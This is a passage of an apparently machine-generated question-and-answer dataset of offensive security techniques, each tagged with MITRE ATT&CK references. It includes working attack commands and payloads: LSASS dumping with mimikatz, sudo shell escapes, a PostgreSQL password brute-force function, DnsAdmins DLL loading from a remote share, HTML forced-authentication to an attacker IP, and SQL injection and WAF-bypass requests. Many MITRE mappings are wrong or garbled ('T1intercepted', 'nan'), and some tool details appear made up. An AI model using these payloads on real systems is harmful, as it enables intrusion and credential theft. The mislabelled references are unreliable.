- Leverage other system functions like mail(), mb_send_mail(), etc. that may not be restricted by open_basedir
- Use PHP's built-in capabilities to read, write, and execute files within the allowed paths MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: Execution.

## Q: How do you mount the hard drive on the victim machine once booted into the live Linux USB?
A: First, find the partitions using `sudo su` and `fdisk -l`. Then create a mount point with `mkdir /media/windows` and mount the disk with `mount -t ntfs /dev/sda1 /media/windows`. This will allow you to access all the files from the hard drive in the `/media/windows` directory. Remember to `umount /media/windows` when done. MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: How can you dump the password hashes from the victim machine once you have physical access?
A: You can follow the guide at https://prakharprasad.com/windows-password-cracking-using-john-the-ripper/ to dump the password hashes from the system once you have mounted the hard drive. MITRE References: MITRE ID is T1003.001, MITRE Name is: OS Credential Dumping: LSASS Memory, and MITRE Tactics are: Credential Access.

## Q: How can you use INCEPTION to perform physical memory manipulation through DMA attacks?
A: INCEPTION is a tool designed for physical memory manipulation through DMA, compatible with interfaces like FireWire and Thunderbolt. It allows for bypassing login procedures by patching memory to accept any password. However, it's ineffective against Windows 10 systems. MITRE References: MITRE ID is T1055.001, MITRE Name is: Process Injection: Dynamic-link Library Injection, and MITRE Tactics are: Defense Evasion, Execution, Privilege Escalation.

## Q: How can you use Live CD/USB to change system binaries and access the command prompt with system privileges?
A: Changing system binaries like sethc.exe or Utilman.exe with a copy of cmd.exe can provide a command prompt with system privileges. Tools such as chntpw can be used to edit the SAM file of a Windows installation, allowing password changes. Kon-Boot is a tool that facilitates logging into Windows systems without knowing the password by temporarily modifying the Windows kernel or UEFI. MITRE References: MITRE ID is T1548.002, MITRE Name is: Abuse Elevation Control Mechanism: Bypass User Account Control, and MITRE Tactics are: Privilege Escalation.

## Q: How can you use Bad USB devices like Rubber Ducky and Teensyduino to execute predefined payloads on target computers?
A: Devices like Rubber Ducky and Teensyduino serve as platforms for creating bad USB devices, capable of executing predefined payloads when connected to a target computer. MITRE References: MITRE ID is T1200, MITRE Name is: Hardware Additions, and MITRE Tactics are: Initial Access.

## Q: How can you bypass BitLocker encryption by finding the recovery password in a memory dump file?
A: BitLocker encryption can potentially be bypassed if the recovery password is found within a memory dump file (MEMORY.DMP). Tools like Elcomsoft Forensic Disk Decryptor or Passware Kit Forensic can be utilized for this purpose. MITRE References: MITRE ID is T1003.004, MITRE Name is: OS Credential Dumping: NTDS, and MITRE Tactics are: Credential Access.

## Q: How can you use social engineering tactics to add a new BitLocker recovery key to bypass encryption?
A: A new BitLocker recovery key can be added through social engineering tactics, convincing a user to execute a command that adds a new recovery key composed of zeros, thereby simplifying the decryption process. MITRE References: MITRE ID is T1187, MITRE Name is: Forced Authentication, and MITRE Tactics are: Credential Access.

## Q: How can you bypass PIE protections?
A: In order to bypass PIE it's needed to **leak some address of the loaded** binary, there are some options for this:

* **Disabled ASLR**: If ASLR is disabled a binary compiled with PIE is always **going to be loaded in the same address**, therefore **PIE is going to be useless** as the addresses of the objects are always going to be in the same place.
* Be **given** the leak (common in easy CTF challenges, [**check this example**](https://ir0nstone.gitbook.io/notes/types/stack/pie/pie-exploit))
* **Brute-force EBP and EIP values** in the stack until you leak the correct ones:
* Use an **arbitrary read** vulnerability such as [**format string**](/binary-exploitation/format-strings) to leak an address of the binary (e.g. from the stack, like in the previous technique) to get the base of the binary and use offsets from there. [**Find an example here**](https://ir0nstone.gitbook.io/notes/types/stack/pie/pie-bypass). MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0005 - Defense Evasion, TA0004 - Privilege Escalation.

## Q: How can Pixiewps be used to bruteforce the WPS pin in an offline attack?
A: Pixiewps is a tool that can be used to bruteforce the WPS pin in an offline attack, exploiting the low or non-existing entropy of some access points. To use Pixiewps, you need to provide the following parameters:

- `-e <pke>`: Enrollee's DH public key, found in M1
- `-s <e-hash1>`: Enrollee hash-1, found in M3
- `-z <e-hash2>`: Enrollee hash-2, found in M3
- `-n <e-nonce>`: Enrollee's nonce, found in M1
- `-m <r-nonce>`: Registrar's nonce, found in M2
- `-b <e-bssid>`: Enrollee's BSSID

For example:

```
root@kali:~# pixiewps -e <pke> -s <e-hash1> -z <e-hash2> -n <e-nonce> -m <r-nonce> -b <e-bssid>
```

This will bruteforce the WPS pin and display the result. Pixiewps version 1.4 is used in this example. MITRE References: MITRE ID is T1546, MITRE Name is: Event Triggered Execution, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can Pixiewps be used to recover the WPA-PSK and secret nonce of a vulnerable access point?
A: Pixiewps can be used to recover the WPA-PSK and secret nonce of a vulnerable access point by providing the following additional parameters:

- `-7 <enc7>`: Encrypted settings, found in M7
- `-5 <enc5>`: Encrypted settings, found in M5 (must be used with `-7`)

For example:

```
root@kali:~# pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> -7 <enc7> --mode 3
root@kali:~# pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> -7 <enc7> -5 <enc5> --mode 3
```

This will recover the WPA-PSK and secret nonce, which can be used to gain access to the vulnerable access point. Pixiewps version 1.4 is used in this example. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: What are some places of interest to steal NTLM hashes?
A: Check the article at https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/ for details on places to steal NTLM hashes, such as LLMNR, NBT-NS, WPAD, Kerberos, and others. MITRE References: MITRE ID is T1560, MITRE Name is: Archive Collected Data, and MITRE Tactics are: Collection.

## Q: How can plocate be used to escalate privileges on a Linux system during a CTF challenge?
A: plocate version 1.1.22-2 could potentially be used to escalate privileges on a Linux system during a CTF challenge by quickly locating sensitive files or configuration data. For example, you could use `plocate` to search for files containing the word 'password' or 'sudo', which may reveal credentials or other sensitive information that could be used to gain elevated access. However, privilege escalation techniques should only be used ethically and in an authorized context, such as a CTF or pen test environment. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can you perform a dictionary-based password brute-force attack against a PostgreSQL database using PL/pgSQL?
A: You can perform a dictionary-based password brute-force attack against a PostgreSQL database using the following PL/pgSQL function:

```sqlCREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT, username TEXT, dbname TEXT) RETURNS TEXT AS$$BEGIN    FOR word IN (SELECT word FROM dblink('host=1.2.3.4 user=name password=qwerty dbname=wordlists', 'SELECT word FROM wordlist') RETURNS (word TEXT)) LOOP        BEGIN            PERFORM(SELECT * FROM dblink(' host=' || host || ' port=' || port || ' dbname=' || dbname || ' user=' || username || ' password=' || word, 'SELECT 1') RETURNS (i INT));            RETURN word;        EXCEPTION            WHEN sqlclient_unable_to_establish_sqlconnection THEN                -- do nothing        END;    END LOOP;    RETURN NULL;END;$$ LANGUAGE 'plpgsql';-- Call the functionselect brute_force('127.0.0.1', '5432', 'postgres', 'postgres');```

This function uses the `dblink` function to connect to a remote database (in this case, a database containing a wordlist) and then iterates through the words in the wordlist, attempting to log in to the target PostgreSQL server with each word as the password. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can polenum be used to extract the password policy information from a remote Windows system?
A: polenum can be used to extract the password policy information from a remote Windows system without needing to access a Windows machine directly. It utilizes the Impacket Library from CORE Security Technologies to query the remote system's password policy over the SMB protocol. To use polenum, you can run the following command, providing the appropriate username, password, domain, and protocol (e.g., 445/SMB):

```console
polenum victim:s3cr3t@192.168.1.200 '445/SMB'
```

This will display the password policy details, including the minimum password length, password history length, maximum password age, password complexity flags, minimum password age, account lockout threshold, and more. MITRE References: MITRE ID is T1097, MITRE Name is: Exchange Email Delegation, and MITRE Tactics are: Lateral Movement.

## Q: How can pompem be used to download exploit files once they are identified?
A: Pompem version 0.2.0-6 can be used to download exploit files directly once they are identified. To do this, run the following command:

```
pompem -g
```

This will prompt the user to select the exploit they want to download, and then download the file to the current directory. MITRE References: MITRE ID is T1588.003, MITRE Name is: Obtain Capabilities: Exploit, and MITRE Tactics are: Resource Development.

## Q: How can an attacker bypass port knocking security measures?
A: One way to hack a server with port knocking is to sniff the network traffic and capture the port knock sequence. If you can perform a man-in-the-middle attack on the network, you can observe the port knocking traffic and discover the sequence needed to access the secured service. Defending against this would require using encryption or other measures to protect the port knocking traffic. MITRE References: MITRE ID is T1040, MITRE Name is: Network Sniffing, and MITRE Tactics are: Credential Access, Discovery.

## Q: How can PoshC2 be used to perform lateral movement on a target network?
A: PoshC2 version 7.4.0 supports lateral movement through its built-in 'Invoke-PoshRat' module, which can be used to execute PowerShell scripts remotely on other systems. This can be done by generating a new implant that connects back to the C2 server and allows execution of arbitrary PowerShell commands. Additionally, PoshC2 integrates with the SharpSocks SOCKS proxy to enable pivoting and further lateral movement across the network. MITRE References: MITRE ID is T1570, MITRE Name is: Lateral Tool Transfer, and MITRE Tactics are: Lateral Movement.

## Q: How can PoshC2 be used to maintain persistence on a compromised system?
A: PoshC2 version 7.4.0 supports various persistence mechanisms, including registering a Windows service, creating a scheduled task, or modifying registry keys to automatically execute the implant on system startup. These techniques can be used to maintain access to the compromised system even after the initial access is lost. MITRE References: MITRE ID is T1543, MITRE Name is: Create or Modify System Process, and MITRE Tactics are: Persistence.

## Q: How can PoshC2 be used to evade detection by antivirus and other security solutions?
A: PoshC2 version 7.4.0 provides a variety of features to evade detection, including the ability to generate payloads that bypass common antivirus engines, use of obfuscation techniques, and the integration of the Donut payload encoder to create shellcode that is difficult to detect. Additionally, PoshC2 generates Apache rewrite rules to protect the C2 infrastructure and maintain operational security. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion.

## Q: How can you bypass WAFs or other restrictions in PostgreSQL using string functions?
A: You can manipulate strings using various PostgreSQL string functions to bypass WAFs or other restrictions. For example, you can use functions like `convert_from` to pass strings as hex and bypass filters. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion.

## Q: How can you use stacked queries and time-based injection to bypass restrictions in PostgreSQL?
A: PostgreSQL supports stacked queries, and you can use time-based injection techniques to bypass restrictions. For example, you can use a query like `1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -` to detect if the user is a superuser and bypass restrictions. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: What are some common techniques for bypassing PostMessage origin checks?
A: Attackers can try to bypass PostMessage origin checks using techniques like:- Exploiting the `event.isTrusted` attribute, which may be considered secure if implemented correctly- Abusing string manipulation functions like `indexOf()`, `search()`, and `match()` which can be susceptible to bypassing- Leveraging prototype pollution vulnerabilities and the `escapeHtml()` function- Setting the `document.domain` property to shorten the domain and relax same-origin policy enforcementAdditionally, if the target web page embeds an iframe with the `allow-popups` sandbox attribute, the origin of the popup window will be set to `null`, which can be abused to bypass origin checks. MITRE References: MITRE ID is T1203, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Execution.

## Q: What is GDir-Thief and how can it be used for post-exploitation?
A: GDir-Thief is a Red Team tool for exfiltrating the target organization's Google People Directory that the attacker has access to, via Google's People API. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Discovery.

## Q: How can powercat (version 0.0~git20200727.4bea000-0kali2) be used to establish a DNS-based covert channel?
A: To establish a DNS-based covert channel using powercat, you can use the following command on the client system:

powercat -c <DNS_SERVER_IP> -p <DNS_SERVER_PORT> -dns <DOMAIN_NAME>

This will connect to the specified DNS server and send traffic over the DNS protocol to the given domain name. On the server side, you need to use the dnscat2 tool to receive the DNS queries and establish the covert channel.

This technique can be used to bypass network restrictions and transfer data in a stealthy manner. MITRE References: MITRE ID is T1571, MITRE Name is: Non-Standard Port, and MITRE Tactics are: Command and Control.

## Q: How can PowerShell Empire be used to establish persistence on a compromised system?
A: PowerShell Empire (version 5.4.2) can be used to establish persistence on a compromised system through techniques like creating scheduled tasks, modifying startup scripts, and abusing Windows Management Instrumentation (WMI). These allow the agent to maintain access to the target system even after the initial compromise. MITRE References: MITRE ID is T1546.003, MITRE Name is: Event Triggered Execution: Windows Management Instrumentation Event Subscription, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can PowerSploit be used to bypass antivirus detection in a penetration test?
A: The AntivirusBypass module in PowerSploit 3.0.0 includes several techniques to help bypass antivirus detection, such as Invoke-Obfuscation for script obfuscation and Invoke-Launchraspisuite for reflective DLL injection. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can you abuse GPOs (Group Policy Objects) using PowerView/SharpView?
A: If an attacker has high privileges over a GPO, they could abuse it to privesc by:

- Adding permissions to a user
- Adding a local admin user to a host
- Creating a scheduled task (immediate) to perform an action

You can use the following commands to enumerate GPOs:

`Get-DomainGPO | select displayName` - Check the names of GPOs for info
`Get-NetGPO` - Get all policies with details
`Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=invented,DC=io" -ResolveGUIDs` - Get who can create new GPOs MITRE References: MITRE ID is T1136, MITRE Name is: Create Account, and MITRE Tactics are: TA0001.

## Q: How can princeprocessor be used for password cracking?
A: Princeprocessor is a password candidate generator that uses the PRINCE algorithm to create chains of combined words from a wordlist. It can be used as an advanced combinator attack to generate password guesses more efficiently than a standard brute-force or dictionary attack. The tool allows you to specify the minimum and maximum number of elements per chain, as well as other optimization options, to fine-tune the password generation process. For example, to generate password candidates using princeprocessor version 0.22-6, you can run: `princeprocessor --pw-min=8 --pw-max=20 --elem-cnt-min=3 --elem-cnt-max=5 wordlist.txt -o output.txt`. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: What are some techniques to force Windows to connect to a server using privileged accounts when already inside the Windows machine?
A: Techniques to force Windows to connect to a server using privileged accounts from inside the Windows machine include using Defender MpCmdRun, MSSQL, and Certutil. For example, you can use Defender MpCmdRun to force a connection to a file on a remote server: C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: DefenseEvasion.

## Q: How can HTML injection be used to force authentication in a Windows environment?
A: HTML injection can be used to force authentication in a Windows environment by embedding an image tag that references a file on a remote server controlled by the attacker. For example, an email with an image tag like <img src="\\10.10.17.231\test.ico" height="1" width="1" /> will cause the recipient's computer to attempt to authenticate to the attacker's server when the email is opened. This can also be accomplished via a man-in-the-middle attack by injecting the HTML into a page the victim is viewing. MITRE References: MITRE ID is T1187, MITRE Name is: Forced Authentication, and MITRE Tactics are: CredentialAccess, InitialAccess.

## Q: How can NTLMv1 challenges be cracked?
A: To crack NTLMv1 challenges, you need to capture the NTLMv1 challenge and set the Responder challenge to "1122334455667788". With this challenge set, you can then use tools like Responder or hashcat to crack the captured NTLMv1 hash. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can I exploit the PrintNightmare vulnerability?
A: To exploit PrintNightmare, you can use tools like Metasploit or PowerShell scripts to gain remote code execution on the target system by abusing the Windows Print Spooler service. However, be aware that this vulnerability has been patched, so the exploit may not work on fully updated systems. MITRE References: MITRE ID is T1133, MITRE Name is: External Remote Services, and MITRE Tactics are: Initial Access.

## Q: How can you list the members of the "Backup Operators" group and leverage their privileges to access the Domain Controller's file system?
A: To list the members of the "Backup Operators" group, you can use the following PowerShell command:

```
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

Members of the "Backup Operators" group have the `SeBackup` and `SeRestore` privileges, which allow them to access the Domain Controller's file system, even without explicit permissions. You can leverage these privileges to copy files like the `NTDS.dit` database, which contains all NTLM hashes for domain users and computers. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Persistence, Privilege Escalation, Initial Access.

## Q: How can you list the members of the "DnsAdmins" group and exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server?
A: To list the members of the "DnsAdmins" group, you can use the following PowerShell command:

```
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

Members of the "DnsAdmins" group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server, often hosted on Domain Controllers. This can be done using the following commands:

```
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
```

The attacker can modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Persistence, Privilege Escalation, Initial Access.

## Q: How can you list the members of the "Exchange Windows Permissions" group and exploit their privileges to modify DACLs on the domain object?
A: To list the members of the "Exchange Windows Permissions" group, you can use the following PowerShell command:

```
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Members of this group can modify DACLs on the domain object, potentially granting DCSync privileges. Techniques for privilege escalation exploiting this group are detailed in the Exchange-AD-Privesc GitHub repository. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Persistence, Privilege Escalation, Initial Access.

## Q: How can you dump the memory of the LSASS process to extract credentials using the SeDebug privilege?
A: You can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) to **capture the memory of the LSASS process**. Then, you can load this dump in mimikatz to obtain passwords:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
``` MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can you get an NT SYSTEM shell using the SeDebug privilege?
A: If you have the SeDebug privilege, you can use tools like:

* [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
* [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
* [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

For example, in PowerShell you can use the psgetsys.ps1 script:

```powershell
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
``` MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you abuse the SeCreateToken privilege to escalate privileges?
A: You can use 3rd party tools to create an arbitrary token, including local admin rights, by abusing the SeCreateToken privilege and the `NtCreateToken` API. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you abuse the SeLoadDriver privilege to escalate privileges?
A: You can abuse the SeLoadDriver privilege to escalate privileges in the following ways:

1. Load a buggy kernel driver such as `szkg64.sys` and exploit the driver vulnerability.
2. Use the built-in `fltMC` command to unload security-related drivers, such as `fltMC sysmondrv`. MITRE References: MITRE ID is T1543, MITRE Name is: Create or Modify System Process, and MITRE Tactics are: Privilege Escalation, Persistence.

## Q: How can you abuse the SeRestore and SeTakeOwnership privileges to escalate privileges?
A: To abuse the SeRestore privilege:

1. Launch PowerShell/ISE with the SeRestore privilege present.
2. Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1).
3. Rename `utilman.exe` to `utilman.old`.
4. Rename `cmd.exe` to `utilman.exe`.
5. Lock the console and press Win+U.

To abuse the SeTakeOwnership privilege:

1. `takeown.exe /f "%windir%\system32"`
2. `icalcs.exe "%windir%\system32" /grant "%username%":F`
3. Rename `cmd.exe` to `utilman.exe`.
4. Lock the console and press Win+U. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you abuse the SeTcb privilege to escalate privileges?
A: You can use 3rd party tools to manipulate tokens and include local admin rights by abusing the SeTcb privilege. This may also require the SeImpersonate privilege. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What are some common locations to search for cleartext passwords on a Windows system?
A: Common locations to search for cleartext passwords on a Windows system include:- config files: findstr /si password *.txt, *.xml, *.ini- common password files: c:\sysprep.inf, c:\sysprep\sysprep.xml, c:\unattend.xml, %WINDIR%\Panther\Unattend\Unattended.xml, %WINDIR%\Panther\Unattended.xml- registry: reg query HKCU\Software\ORL\WinVNC3\Password, reg query HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon, reg query HKLM\SYSTEM\Current\ControlSet\Services\SNMP, reg query HKCU\Software\SimonTatham\PuTTY\Sessions MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: What is the 'AlwaysInstallElevated' Windows Installer setting and how can it be used for privilege escalation?
A: The 'AlwaysInstallElevated' Windows Installer setting, if enabled, allows standard user accounts to run Windows Installer packages with system-level permissions. This can be used for privilege escalation by creating a malicious .msi file and tricking the user into installing it.To check if 'AlwaysInstallElevated' is enabled, run:reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevatedreg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated MITRE References: MITRE ID is T1218, MITRE Name is: Signed Binary Proxy Execution, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How can you escalate from an Administrator account to the SYSTEM account on Windows?
A: To escalate from an Administrator account to the SYSTEM account on Windows:On Windows XP and older:1. Open a command prompt from `c:\windows\system32\cmd.exe` to get an Administrator prompt.2. Run `at 01:23 /interactive cmd.exe` to schedule a SYSTEM-level command prompt to start at 1:23 AM.On Windows Vista and newer:1. Upload PsExec.exe2. Run `psexec -i -s cmd.exe` to get a SYSTEM-level command prompt.Alternatively, you can use the Kitrap vulnerability and run `vdmallowed.exe` followed by `vdmexploit.dll`.In Metasploit, you can also use the `getsystem` command from a meterpreter session to escalate to SYSTEM. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation.

## Q: What are some common ways to abuse sudo rights for privilege escalation?
A: If you have access to programs that can be run with sudo, you may be able to abuse that to escalate your privileges. Some common techniques include:

- awk 'BEGIN {system("/bin/bash")}'
- sudo find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
- sudo less /etc/shadow, then press v to enter vi and :shell
- sudo python -c 'import os; os.system("/bin/bash")'

The key is finding programs that can be used to either run arbitrary commands or overwrite sensitive files like /etc/shadow or /etc/sudoers. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: TA0004.

## Q: How can you check for and potentially abuse misconfigured NFS shares for privilege escalation?
A: To check for and potentially abuse misconfigured NFS shares for privilege escalation, you can use the following commands:

# First check if the target machine has any NFS shares
showmount -e 192.168.1.101

# If it does, then mount it to your filesystem
mount 192.168.1.101:/ /tmp/

If you are able to mount the NFS share, check the contents to see if there are any files or directories that you can write to. If so, you may be able to create a file with the SUID bit set, which could then be used to escalate your privileges when executed. MITRE References: MITRE ID is T1022, MITRE Name is: Data Encrypted for Impact, and MITRE Tactics are: TA0040.

## Q: How can you use prototype pollution to achieve remote code execution via environment variables and command line arguments in Node.js?
A: To achieve remote code execution via prototype pollution in Node.js, an attacker can use techniques like:1. Poisoning the `__proto__` or `constructor.prototype` to inject malicious environment variables or command line arguments that will be executed when a child process is spawned.2. Abusing the `normalizeSpawnArguments` function in the `child_process` module to create new environment variables that can be used to execute arbitrary code.3. Controlling the file path of a required module to load a malicious script that calls `child_process` functions.4. Leveraging relative require paths and polluting the `exports` and `path` properties to load a malicious script.These techniques allow the attacker to execute arbitrary commands on the server by exploiting the prototype pollution vulnerability. MITRE References: MITRE ID is T1203, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Execution.

## Q: How can proxify be used to perform MITM attacks on HTTP/HTTPS traffic?
A: To perform MITM attacks using proxify, you can use the following steps:1. Start proxify with the TLS MITM support:   ```   proxify -tls-server -tls-client -server-cert server.crt -server-key server.key -client-cert client.crt -client-key client.key   ```   This will start the proxy with the necessary TLS certificates to perform MITM attacks.2. Configure the target system to use proxify as the HTTP/HTTPS proxy.3. proxify will now intercept and forward all HTTP/HTTPS traffic, allowing you to inspect, modify, and replay the traffic. MITRE References: MITRE ID is T1intercepted, MITRE Name is: Network Traffic Interception, and MITRE Tactics are: TA0006, TA0011.

## Q: How can the Proxmark3 RDV4.0 tool be used to perform RFID/NFC attacks?
A: The Proxmark3 RDV4.0 is a powerful tool for RFID/NFC security research and penetration testing. It can be used to sniff, emulate, and clone RFID/NFC tags and cards. For example, to dump the contents of an RFID card, you can use the 'hf mf rdump' command to read the card's data. To emulate a card, you can use the 'hf mf sim' command. The Proxmark3 supports a wide range of RFID/NFC protocols including Mifare, iClass, ISO14443, and others. MITRE References: MITRE ID is T1391, MITRE Name is: Indicator Removal on Host, and MITRE Tactics are: Defense Evasion.

## Q: How can the Proxmark3 RDV4.0 be used to bypass physical access controls?
A: The Proxmark3 RDV4.0 can be used to clone and emulate RFID access cards, allowing an attacker to bypass physical access controls. For example, you can use the 'hf iclass read' and 'hf iclass sim' commands to read and clone an iClass access card. This could allow an attacker to gain unauthorized access to restricted areas. Care should be taken when using these capabilities, as they are intended for legitimate security research and penetration testing only. MITRE References: MITRE ID is T1200, MITRE Name is: Hardware Additions, and MITRE Tactics are: Initial Access.

## Q: How can the Proxmark3 RDV4.0 be used to perform wireless network attacks?
A: The Proxmark3 RDV4.0 can be used as a wireless network sniffer and injection tool. It supports a variety of wireless protocols including Bluetooth, Wi-Fi, and others. For example, you can use the 'wc' command to scan for and connect to Bluetooth devices, or the 'wi' commands to interact with Wi-Fi networks. However, care should be taken when using these capabilities, as they could potentially be used for unauthorized access or other malicious purposes. MITRE References: MITRE ID is T1048, MITRE Name is: Exfiltration Over Alternative Protocol, and MITRE Tactics are: Exfiltration.

## Q: How can you bypass Nginx ACL rules using pathname manipulation?
A: Techniques [from this research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Nginx rule example:

```
location = /admin {
    deny all;
}

location = /admin/ {
    deny all;
}
```
In order to prevent bypasses Nginx performs path normalization before checking it. However, if the backend server performs a different normalization (removing characters that nginx doesn't remove) it might be possible to bypass this defense.

**NodeJS - Express**

| Nginx Version | **Node.js Bypass Characters** |
| --- | --- |
| 1.22.0 | `\xA0` |
| 1.21.6 | `\xA0` |
| 1.20.2 | `\xA0`, `\x09`, `\x0C` |
| 1.18.0 | `\xA0`, `\x09`, `\x0C` |
| 1.16.1 | `\xA0`, `\x09`, `\x0C` |

**Flask**

| Nginx Version | **Flask Bypass Characters** |
| --- | --- |
| 1.22.0 | `\x85`, `\xA0` |
| 1.21.6 | `\x85`, `\xA0` |
| 1.20.2 | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0 | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1 | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

**Spring Boot**

| Nginx Version | **Spring Boot Bypass Characters** |
| --- | --- |
| 1.22.0 | `;` |
| 1.21.6 | `;` |
| 1.20.2 | `\x09`, `;` |
| 1.18.0 | `\x09`, `;` |
| 1.16.1 | `\x09`, `;` |

**PHP-FPM**

Nginx FPM configuration:

```
location = /admin.php {
    deny all;
}

location ~ \.php$ {
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx is configured to block access to `/admin.php` but it's possible to bypass this by accessing `/admin.php/index.php`. MITRE References: MITRE ID is T1036, MITRE Name is: Masquerading, and MITRE Tactics are: Defense Evasion.

## Q: How can you bypass ModSecurity rules using path confusion?
A: [**In this post**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) is explained that ModSecurity v3 (until 3.0.12), **improperly implemented the** `**REQUEST_FILENAME**` variable which was supposed to contain the accessed path (until the start of the parameters). This is because it performed an URL decode to get the path.
Therefore, a request like `http://example.com/foo%3f';alert(1);foo=` in mod security will suppose that the path is just `/foo` because `%3f` is transformed into `?` ending the URL path, but actually the path that a server will receive will be `/foo%3f';alert(1);foo=`.

The variables `REQUEST_BASENAME` and `PATH_INFO` were also affected by this bug.

Something similar ocurred in version 2 of Mod Security that allowed to bypass a protection that prevented user accessing files with specific extensions related to backup files (such as `.bak`) simply by sending the dot URL encoded in `%2e`, for example: `https://example.com/backup%2ebak`. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you bypass AWS WAF ACL rules using malformed headers?
A: [This research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) mentions that it was possible to bypass AWS WAF rules applied over HTTP headers by sending a "malformed" header that wasn't properly parsed by AWS but it was by the backend server.

For example, sending the following request with a SQL injection in the header X-Query:

```
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
